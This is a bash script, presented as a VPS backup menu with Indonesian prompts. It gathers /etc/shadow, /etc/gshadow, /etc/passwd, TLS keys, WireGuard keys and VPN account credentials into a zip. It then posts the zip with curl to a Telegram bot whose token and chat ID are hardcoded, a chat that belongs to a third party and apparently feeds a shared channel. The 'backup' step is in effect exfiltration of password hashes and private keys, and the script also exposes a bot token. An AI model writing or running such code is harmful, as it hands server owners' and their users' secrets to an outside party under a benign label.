#!/bin/bash
clear
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "\E[0;100;33m        • BACKUP DATA VPS •        \E[0m"
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo ""
echo "  BUKA FILE BACKUP DI TELEGRAM  [https://t.me/sallbackup]${NC}"
echo ""
echo "  SESUAI SUBDOMAIN DAN IP VPS ANDA  ${NC}"
echo ""
echo "  GUNAKAN BOT SEBIJAK MUNGKIN"
echo ""
source /var/lib/geovpnstore/ipvps.conf
domain=$(cat /etc/xray/domain)
ips=$(wget -qO- ipinfo.io/ip);
chatid="1001787165690";
api="5264392890:AAGcsX92ZFs4nTUTOjTKZDUb6Tsc-u0Dx-s";
date=$(date +"%Y-%m-%d" | cut -d "-" -f 2-3);
time=$(date +"%H:%M:%S" | cut -d ":" -f 1-2);
rm -f $ips-$date-$time-$domain.zip
rm -rf /root/backup
mkdir -p /root/backup
cd /root
cp /etc/passwd /root/backup
cp /etc/group /root/backup
cp /etc/shadow /root/backup
cp /etc/gshadow /root/backup
cp -r /root/.acme.sh /root/backup/ &> /dev/null
cp -r /etc/wireguard /root/backup/wireguard &> /dev/null
cp /etc/ppp/chap-secrets /root/backup/chap-secrets &> /dev/null
cp /etc/ipsec.d/passwd /root/backup/passwd1 &> /dev/null
cp /etc/shadowsocks-libev/akun.conf /root/backup/ss.conf &> /dev/null
cp -r /var/lib/geovpnstore/ /root/backup/geovpnstore &> /dev/null
cp -r /home/sstp /root/backup/sstp &> /dev/null
cp -r /etc/v2ray /root/backup/v2ray &> /dev/null
cp -r /etc/ssh/akun.conf /root/backup/ssh.conf &> /dev/null
cp -r /etc/xray /root/backup/xray &> /dev/null
cp -r /etc/trojan-go /root/backup/trojan-go &> /dev/null
cp -r /usr/local/shadowsocksr/ /root/backup/shadowsocksr &> /dev/null
cp -r /home/vps/public_html /root/backup/public_html &> /dev/null
cp -r /etc/cron.d /root/backup/cron.d &> /dev/null
cp /etc/crontab /root/backup/crontab &> /dev/null
cp /etc/xray/domain /root/backup/domain
cd /root
zip -r $domain-$ips-$date-$time.zip backup > /dev/null 2>&1
curl -F document=@"$domain-$ips-$date-$time.zip" https://api.telegram.org/bot$api/sendDocument?chat_id=$chatid
rm -f $domain-$ips-$date-$time.zip
clear
echo ""
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "\E[0;100;33m        • BACKUP DATA VPS •        \E[0m"
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo ""
echo "  BUKA FILE BACKUP DI TELEGRAM  [https://t.me/sallbackup]${NC}"
echo ""
echo "  SESUAI SUBDOMAIN DAN IP VPS ANDA $domain-$ips ${NC}"
echo ""
echo "  GUNAKAN BOT SEBIJAK MUNGKIN ${NC}"
echo ""
echo ""
read -n 1 -s -r -p "Press any key to back on menu"
menu-backup
echo ""
echo ""
